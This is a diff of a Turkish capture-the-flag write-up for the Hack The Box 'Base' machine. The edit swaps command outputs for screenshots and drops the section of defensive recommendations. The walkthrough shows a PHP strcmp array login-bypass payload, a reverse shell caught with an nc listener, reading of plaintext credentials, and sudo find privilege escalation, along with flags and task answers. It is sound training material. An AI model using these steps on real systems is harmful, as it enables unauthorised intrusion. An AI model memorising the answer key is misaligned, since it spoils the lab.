@@ -1,21 +1,11 @@
-# HTB - Base Box Writeup
-
-**Hedef:** 10.129.186.88
-**Tarih:** 28.08.2026
-
 ## Nmap Taraması
 
 ```
 nmap -sS -A -p- -T5 10.129.186.88
 ```
 
-```
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-title: Welcome to Base
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-```
+<img width="777" height="345" alt="nmap" src="https://github.com/user-attachments/assets/943549b8-84ed-41f9-943f-09167fa35996" />
+
 
 İki port açık: 22'de SSH, 80'de ise Apache üzerinde çalışan bir web sitesi. Kimlik bilgim olmadığı için önce web tarafına yöneldim.
 
@@ -27,15 +17,12 @@ Siteyi gezerken bir login sayfasına rastladım:
 http://10.129.186.88/login/login.php
 ```
 
-`/login` dizinine gittiğimde üç dosya dikkatimi çekti:
+`/login` dizinine gittiğimde bu dosyalar gözüküyordu:
 
-```
-/config.php
-/login.php
-/login.php.swp
-```
+<img width="414" height="270" alt="login" src="https://github.com/user-attachments/assets/1e3317ef-d28b-483f-9580-2679a981655a" />
 
-`.swp` uzantılı dosya hemen ilgimi çekti çünkü bu, Vim editörünün bir dosya düzenlenirken oluşturduğu geçici swap dosyası. Genellikle editör düzgün kapatılmadığında sunucuda unutulmuş olur ve kaynak koda dair ciddi bilgi sızdırabilir.
+
+`.swp` uzantılı dosya hemen ilgimi çekti çünkü bu, Vim editörünün bir dosya düzenlenirken oluşturduğu geçici swap dosyası. 
 
 Dosyayı indirdim ve `cat` ile içeriğine baktım:
 
@@ -62,7 +49,7 @@ if (!empty($_POST['username']) && !empty($_POST['password'])) {
 }
 ```
 
-Burada dikkatimi çeken şey `strcmp()` kullanımı oldu. PHP'de `strcmp()` fonksiyonu, karşılaştırdığı parametrelerden biri string değil de bir dizi (array) olursa hata verir ve bu hata durumunda fonksiyon `NULL` döner. PHP'de gevşek karşılaştırmada (`==`) `NULL`, `0`'a eşit kabul edilir. Yani `$_POST['username']` ve `$_POST['password']` değerlerini string yerine dizi olarak gönderirsem, `strcmp()` fonksiyonu hata verip `NULL` dönecek, bu da `0`'a eşit sayılacağı için karşılaştırma "doğru" gibi değerlendirilecekti. Klasik bir type juggling / authentication bypass zafiyeti.
+Burada dikkatimi çeken şey `strcmp()` kullanımı oldu. PHP'de `strcmp()` fonksiyonu, karşılaştırdığı parametrelerden biri string değil de bir dizi (array) olursa hata verir ve bu hata durumunda fonksiyon `NULL` döner. PHP'de gevşek karşılaştırmada (`==`) `NULL`, `0`'a eşit kabul edilir. Yani `$_POST['username']` ve `$_POST['password']` değerlerini string yerine dizi olarak gönderirsem, `strcmp()` fonksiyonu hata verip `NULL` dönecek, bu da `0`'a eşit sayılacağı için karşılaştırma "doğru" gibi değerlendirilecekti.
 
 ## Kimlik Doğrulama Atlatma
 
@@ -71,6 +58,8 @@ Bunu test etmek için login isteğini Burp Suite ile yakaladım ve parametreleri
 ```
 username[]=admin&password[]=burak
 ```
+<img width="591" height="164" alt="upload" src="https://github.com/user-attachments/assets/b4c475ce-ccd7-47e1-9dcc-4cd0fdcc3267" />
+
 
 İstek gönderildiğinde giriş başarılı oldu ve `/upload.php` sayfasına yönlendirildim. Herhangi bir gerçek kimlik bilgisi bilmeden, sadece PHP'nin bu tip karşılaştırma zafiyetini kullanarak içeri girmiş oldum.
 
@@ -82,11 +71,8 @@ username[]=admin&password[]=burak
 ffuf -u http://10.129.186.88/FUZZ -w /usr/share/wordlists/dirb/big.txt
 ```
 
-```
-.htaccess   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1204ms]
-.htpasswd   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4212ms]
-_uploaded   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 51ms]
-```
+<img width="715" height="418" alt="ffuf" src="https://github.com/user-attachments/assets/7756ad6f-8b0a-4966-b58f-7ffed0b60ec5" />
+
 
 `_uploaded` isimli bir dizin doğrudan karşıma çıktı — yüklediğim dosyaların düştüğü yer buydu.
 
@@ -100,12 +86,7 @@ nc -lvnp 4444
 
 Sonra tarayıcıdan `_uploaded/` dizinine giderek yüklediğim shell dosyasını tetikledim. Bağlantı hemen geldi:
 
-```
-listening on [any] 4444 ...
-connect to [10.10.14.156] from (UNKNOWN) [10.129.186.88] 49286
-Linux base 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
+<img width="850" height="211" alt="shell" src="https://github.com/user-attachments/assets/e24e921d-e318-49d7-b552-3325641eab06" />
 
 `www-data` yetkisiyle bir shell elde ettim. TTY'yi daha kullanılabilir hale getirmek için:
 
@@ -121,11 +102,8 @@ Login sayfasında gördüğüm `config.php` dosyasını bu sefer shell üzerinde
 www-data@base:/var/www/html/login$ cat config.php
 ```
 
-```php
-<?php
-$username = "admin";
-$password = "thisisagoodpassword";
-```
+<img width="561" height="116" alt="configphp" src="https://github.com/user-attachments/assets/fa8adb08-fb56-4898-814d-0966bd2d7f6c" />
+
 
 Bu bilgiyle sisteme SSH ile erişmeyi denemeden önce, sistemde başka hangi kullanıcıların olduğuna baktım:
 
@@ -149,6 +127,9 @@ Parola olarak `thisisagoodpassword` girildiğinde giriş başarılı oldu.
 john@base:~$ cat user.txt
 f54846c258f3b4612f78a819573d158e
 ```
+
+<img width="271" height="66" alt="flag" src="https://github.com/user-attachments/assets/6d170838-c346-4fcd-ad2b-f8bb40cd2ccd" />
+
 
 ## Yetki Yükseltme
 
@@ -181,29 +162,18 @@ root@base:/root# cat root.txt
 51709519ea18ab37dd6fc58096bea949
 ```
 
-## Sonuç
-
-Base box'ı, birden fazla klasik zafiyetin bir arada kurgulandığı öğretici bir örnek: unutulmuş bir `.swp` dosyası üzerinden kaynak kod sızıntısı, PHP'nin gevşek tip karşılaştırmasından kaynaklanan bir authentication bypass, dosya yükleme sonrası erişilebilir dizin keşfi ve son olarak `sudo` ile yanlış yapılandırılmış bir `find` binary'si üzerinden root'a çıkış.
-
-Gerçek bir ortamda bu bulguları raporlarken şunları vurgulardım:
-
-- Editör swap/backup dosyaları (`.swp`, `~`, `.bak` vb.) production sunucusunda asla kalmamalı, deploy sürecine dahil edilmemeli
-- PHP'de kullanıcı girdisi karşılaştırılırken `strcmp()` yerine `hash_equals()` gibi tip güvenli fonksiyonlar tercih edilmeli, ya da gevşek (`==`) yerine katı (`===`) karşılaştırma kullanılmalı
-- Yüklenen dosyaların tutulduğu dizinler tahmin edilebilir isimlerde olmamalı ve doğrudan çalıştırılabilir script barındırmamalı (upload dizini için execute yetkisi kaldırılmalı)
-- `sudo` ile verilen yetkiler mümkün olduğunca dar tutulmalı; `find`, `vim`, `less` gibi GTFOBins'te yer alan komutlara root yetkisiyle sınırsız erişim verilmemeli
-
----
+<img width="753" height="269" alt="root" src="https://github.com/user-attachments/assets/60f6c947-e0be-4c6e-a9d1-74e1dfaba127" />
 
 ## Görev Soruları ve Cevapları
 
 **Görev 1 — Uzak sunucuda hangi iki TCP portu açık?**
-22 (SSH) ve 80 (HTTP)
+`22,80`
 
 **Görev 2 — Giriş sayfası için web sunucusundaki göreceli yol nedir?**
 `/login/login.php`
 
 **Görev 3 — '/login' dizininde kaç dosya bulunmaktadır?**
-3 (config.php, login.php, login.php.swp)
+`3`
 
 **Görev 4 — Takas dosyasının dosya uzantısı nedir?**
 `.swp`
@@ -215,7 +185,7 @@ Gerçek bir ortamda bu bulguları raporlarken şunları vurgulardım:
 `_uploaded`
 
 **Task 7 — Which user exists on the remote host with a home directory?**
-john
+`john`
 
 **Task 8 — What is the password for the user present on the system?**
 `thisisagoodpassword`
@@ -227,7 +197,7 @@ john
 `/usr/bin/find`
 
 **Task 11 — What action can the find command use to execute commands?**
-`-exec`
+`exec`
 
 **Kök Bayrağı Gönder — Submit the flag located on the administrator's desktop.**
 `51709519ea18ab37dd6fc58096bea949`
